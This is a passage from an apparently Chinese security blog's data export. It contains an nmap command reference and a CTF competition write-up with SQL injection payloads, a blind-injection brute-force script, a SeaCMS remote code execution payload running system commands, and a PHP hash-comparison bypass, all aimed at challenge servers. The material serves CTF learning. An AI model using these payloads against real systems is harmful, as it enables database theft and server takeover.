得到flag:1JACTF&#123;48_pan_119_tokens_pass&#125;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"nmap的使用","slug":"nmap的使用","date":"2019-04-08T15:13:29.000Z","updated":"2019-05-08T15:38:02.174Z","comments":true,"path":"2019/04/08/nmap的使用/","link":"","permalink":"http://yoursite.com/2019/04/08/nmap的使用/","excerpt":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。","text":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。 nmap的主要功能 探测一组主机是否在线 扫描主机的端口，嗅探所提供的网络服务 推断主机所使用的操作系统 nmap 端口状态的判断123456open : 应用程序在该端口接受TCP连接或者UDP报文closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 nmap的基础语法 namp -A [ip地址] 1全面扫描指定IP namp 192.168.1.1/24 1扫描整个子网 nmap [ip地址1] [ip地址2] 1扫描多个目标 nmap 192.168.1.1-100 12扫描一个范围内的目标扫描ip地址为192.168.1.1-192.168.1.100内的所有主机 nmap -iL 1.txt 1扫描1.txt下的所有的IP列表 nmap -sL 192.168.1.1/24 1可以看到你扫描的所有主机的列表 nmap 192.168.1.1/24 -exclude 192.168.1.1 1扫描除了某一个ip外的所有子网主机 nmap 192.168.1.1/24 -exclude 1.txt 1扫描除了某一个文件中ip外的子网主机 nmap -p80,21,23 192.168.1.1 1扫描特定主机的80，21，23端口 nmap -p 80-160 192.168.0.101 1扫描指定范围内的端口 nmap 192.168.0.101,102,103 1使用IP地址的最后一个字节扫描多台服务器 以上为nmap的最常用的基础命令 nmap -sP 192.168.43.8/24 12ping扫描方式，只进行ping，然后显示在线的主机。这样获取目标信息而不会被轻易发现发现。ping扫描只是判断主机是否存活在网络中。 nmap -P0 192.168.1.1 123456789无ping扫描：通常用于防火墙禁止ping的情况下，它能确定正在运行的机器。nmap -P0 [协议1、协议2] [目标ip]nmap支持的协议和编号1.tcp:对应的协议编号为62.ICMP:对应的协议编号为13.IGMP：对应的协议编号为24.UDP：对应的协议编号为17通过使用TCP、UDP、IGMP协议向目标主机发送包并判断目标主机是否在线 nmap -sS 192.168.1.1 1不会在目标主机产生日志信息，通过TCP的SYN包获取主机信息 nmap -sT 192.168.1.1 1适用于找出TCP和UDP端口 nmap -sU 192.168.1.1 1用来扫描主机打开的UDP端口：不会发送syn包，通过发送udp数据包到目标主机，等待目标主机响应，返回ICMP不可达，代表端口关闭。 nmap -sF 192.168.1.1 12不会在目标主机产生日志信息如果TCP SYN被防火墙拦截，用FIN标志的数据包获取主机信息。（FIN重置位，用来代表断开连接） nmap -sV 192.168.1.1 123扫描目标主机的端口上运行的软件版本它不是用于扫描目标主机开放的端口，但需要从开放的端口获取信息来判断软件的版本，所以需要先进行端口扫描。 nmap -sL 192.168.1.7 192.168.1.1 1伪装一个主机的ip发送扫描数据包 nmap -A 192.168.1.1 1检测目标主机系统信息和路由信息 nmap -O 192.168.1.1 1检测目标主机操作系统和软件 nmap -sA 192.168.1.1 1扫描住的侦测防火墙 nmap -PN 192.168.1.1 1扫描主机是不是由防火墙的保护 nmap -F 192.168.1.1 1快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其他端口 nmap -r 192.168.1.1 1顺序扫描端口 nmap –iflist 1打印本地主机接口和路由 nmap -sN 192.168.1.1 1TCP空扫描","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/tags/安全工具/"}]},{"title":"2019年嘉韦思杯wp","slug":"上海嘉韦思杯","date":"2019-03-30T16:00:00.000Z","updated":"2019-05-08T17:10:26.839Z","comments":true,"path":"2019/03/31/上海嘉韦思杯/","link":"","permalink":"http://yoursite.com/2019/03/31/上海嘉韦思杯/","excerpt":"2019年嘉韦思杯wp","text":"2019年嘉韦思杯wp 土肥原贤二发现存在报错注入的可能： 于是进行尝试123456789101112131415161718192021222324251&apos; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#得到信息：could not to the database XPATH syntax error: &apos;~5.7.25-log~&apos;爆库：1&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#could not to the database XPATH syntax error: &apos;~luozhen~&apos;爆表：1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#could not to the database XPATH syntax error: &apos;~flag,goods~&apos;爆列名：1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;),0x7e),1)#could not to the database XPATH syntax error: &apos;~id,flag~&apos;得到flag:1&apos; and updatexml(1,concat(0x7e,(SELECT flag from flag),0x7e),1)#could not to the database XPATH syntax error: &apos;~20_welcome_19~&apos; flag{20_welcome_19} 吴佩孚打开连接发现是特别长的一个字符串 二话不说直接base64解码1(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]) 这个是jsfuck加密在线解密 得到flag1flag&#123;sdf465454dfgert32&#125; 死亡真相发现是一段声音录像 将WAV文件放入Audacity中 查看频普图发现提示 1flag：85a9d4517d4725_b9_8cbc9fd_554216 但是提交不上去 发现是个假的flag 通过查看文件属性发现多次出现0于是将_替换为0 ：1285a9d4517d47250b908cbc9fd0554216再由md5解密可得flag：hsd132456 日军空袭发现这有事以长传的字符串 老样子 base64解码 这下需要点好多次1fB__l621a4h4g_ai&#123;&amp;i&#125; 的到这样的字符串 仔细观察 发现别有玄机12345fB__l621a4h4g_ai&#123;&amp;i&#125; 竖着看就可得到flag1flag&#123;B64_&amp;_2hai_14i&#125; 戴星炳打开页面123天下武功，唯快不破！你能在2秒内算出下面的数学表达式结果吗？0x11 * (0x63 + 0xEE) + ( 0x30 ^ 0x1C) + 0x8D % 0xF6 + 0x19 这就要写脚本跑一下了12345678910111213141516171819202122#!/usr/bin/python#coding=utf-8import reimport requestsimport sysreload(sys)sys.setdefaultencoding(&quot;utf8&quot;)s = requests.Session()url = &apos;http://47.103.43.235:82/web/a/index.php&apos;r = s.get(url=url)# print r.texta = re.search(r&apos;&lt;/p&gt;&lt;p&gt;(.*)&lt;/p&gt;\\n&lt;form&apos;, r.text, re.M | re.S).group(1)res = eval(a)data =&#123; &apos;result&apos;:res, &apos;Submit&apos;:&apos;Submit&apos;&#125;print eval(a)b =s.post(url=url,data=data)print b.text 得到flag1flag&#123;Y0U_4R3_3o_F4ST!&#125; 大美晚报打开题目链接后是一个二维码，保存下来binwalk一下发现存在压缩包，-e参数分离出来 打开后发现有加密，但是给出来提示 那这就好办了，密码全部是数字，可以用压缩包爆破神器ARCHPR.exe来进行爆破，时间比较长,爆破出来密码是：674290437 flag：flag{d6@YX$_m^aa0} 得到flag：flag{d6@YX$_m^aa0} 潘汉年打开得到了一个字符串1bg[`sZ*Zg&apos;dPfP`VM_SXVd 想了一下 有可能会和ascii码有关所以123456bg[`sZ*Zg&apos;dPfP`VM_SXVd的ASCII码为：98,103,91,96,115,90,42,90,103,39,100,80,102,80,96,86,77,95,83,88,86,100flag的ASCII码为：102,108,97,103 观察发现他们的第一位 相差4 第二位相差5 第三位相差6123456789101112131415str = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot;# str_1 = &quot;flag&quot;flag = &quot;&quot;j=4for i in range(len(str)): flag += chr(ord(str[i])+j) j = j+1print flag得到flag:flag&#123;c4es4r_variation&#125; 袁殊解题步骤：下载文件解压：得到两个文件 用kali linux的 openssl123456789101112131415openssl rsa -pubin -text -modulus -in warmup -in RSA256/RSA256/gy.key得到：Public-Key: (256 bit)Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9Exponent: 65537 (0x10001)Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9writing RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni0bXTcqTQiRLZAgMBAAE=-----END PUBLIC KEY----- 可以看到Exponent: 65537，这里成为en的十六进制是Modules：A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9用python转成转成十进制： 123456789101112&gt;pythonPython 3.6.4 (v3.6.4:d48eceb, Dec 19 2017, 06:54:40) [MSC v.1900 64 bit (AMD64)] on win32Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; a=0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9&gt;&gt;&gt; a76775333340223961139427050707840417811156978085146970312315886671546666259161再将n进行因式分解来得到我p和q (使用http://factordb.com/)p=273821108020968288372911424519201044333q=280385007186315115828483000867559983517 最后写好脚本，得出flag：123456789101112131415161718192021#coding:utf-8 import gmpy import rsa p = 273821108020968288372911424519201044333 q = 280385007186315115828483000867559983517 n = 76775333340223961139427050707840417811156978085146970312315886671546666259161 e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(&quot;./fllllllag.txt&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 flag{_2o!9_CTF_ECUN_}晴气庆胤打开页面得到： 查看页面源代码： 发现这中类行题 以前遇见过直接playload 这样就得到了flag 冈村宁次打开网址为：http://47.103.43.235:83/web/a/index.php?id===QM 感觉他传递的参数有一点像base64 发现是1 base64编码的逆序输出 所以测试一下：传递参数：if(1,1,2) 编码后为：pIDLxwSMoYWa 传递参数：if(0,1,2) 编码后为：pIDLxwCMoYWa fuzz一下 发现了 过滤了 空格 等号12其中 空格用 /*1*/ 绕过等号用 like 绕过 于是编写脚本123456789101112131415161718192021222324252627282930313233343536373839import base64import requestsimport sysreload(sys)sys.setdefaultencoding(&quot;utf8&quot;)def string_reverse(m): s = base64.b64encode(m) num=len(s) a=&quot;&quot; for i in range(num): a += s[num-1-i] return aurl =&quot;http://47.103.43.235:83/web/a/index.php?id=&quot;flag =&quot;&quot;for i in range(1,40): for j in range(33,128): # playload = &quot;if((ascii(substr(database(),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/group_concat(table_name)/*a*/from/*a*/infoorrmation_schema.tables/*a*/ where/*a*/table_schema/*a*/like/*a*/ database()),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/ group_concat(column_name)/*a*/ from /*a*/infoorrmation_schema.columns/*a*/ where/*a*/ table_name/*a*/like/*a*/&apos;flag&apos;),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; playload = &quot;if((ascii(substr((seleselectct/*a*/flag /*a*/from/*a*/ flag),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # print playload # exit() playload = string_reverse(playload) # print playload r=requests.get(url+playload) # print url+playload # print r.text # exit() if &quot;2019-11-11&quot; in r.text: flag += str(chr(j)) print flag break就能得到flag:flag&#123;s9li_1s_s0_e4sY&#125; 作战计划进入发现是 seacms 可能存在任意代码执行 原理详见：https://www.jianshu.com/p/a3a18f233184 故playload:123http://47.103.43.235:84/search.php?searchtype=5&amp;tid=6&amp;year=2014);assert($_POST[&quot;raidsh&quot;]);//post传参：radish=system(&quot;cat $(find / -name flag*)&quot;) 就能得到flag 池步洲打开页面 查看页面源代码： 发现index.phps 页面1234567891011&lt;?phperror_reporting(0);$flag = &apos;********&apos;;if (isset($_POST[&apos;name&apos;]) and isset($_POST[&apos;password&apos;]))&#123; if ($_POST[&apos;name&apos;] == $_POST[&apos;password&apos;]) print &apos;name and password must be diffirent&apos;; else if (sha1($_POST[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;])) die($flag); else print &apos;invalid password&apos;;&#125;?&gt; 代发审计一波 发现可以绕过12345post传参：name[]=a&amp;password[]=b就可以得到flag:flag&#123;Y0u_just_br0ke_sha1&#125; obfuse32位ELF文件，无壳，载入IDA中通过关键字符串查找关键代码但是发现f5不好使，只能看汇编，首先输出“password：”，然后再从缓存区读取一串字符串，进入到sub_8048580进行验证，若返回0，则输入的是错误的，若返回1则输入的是正确的 在sub_8048580函数中是一位一位的check123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225_BOOL4 __cdecl sub_8048580(int a1, signed int a2)&#123; signed int v2; // edx char v3; // al _BOOL4 result; // eax char v5[33]; // [esp+Ch] [ebp-A0h] char b20_1; // [esp+2Dh] [ebp-7Fh] char b1f_1; // [esp+2Eh] [ebp-7Eh] char b1e_1; // [esp+30h] [ebp-7Ch] char b1d_1; // [esp+31h] [ebp-7Bh] char b1c_1; // [esp+32h] [ebp-7Ah] char b1b_1; // [esp+33h] [ebp-79h] char b1a_1; // [esp+35h] [ebp-77h] char b19_1; // [esp+36h] [ebp-76h] char b18_1; // [esp+37h] [ebp-75h] char b17_1; // [esp+38h] [ebp-74h] char b16_1; // [esp+39h] [ebp-73h] char b15_1; // [esp+3Ah] [ebp-72h] char b14_1; // [esp+3Ch] [ebp-70h] char b13_0; // [esp+3Dh] [ebp-6Fh] char b12_0; // [esp+3Eh] [ebp-6Eh] char b11_0; // [esp+3Fh] [ebp-6Dh] char b10_0; // [esp+40h] [ebp-6Ch] char bf_0; // [esp+41h] [ebp-6Bh] char be_0; // [esp+42h] [ebp-6Ah] char bd_0; // [esp+43h] [ebp-69h] char bc_1; // [esp+44h] [ebp-68h] char bb_1; // 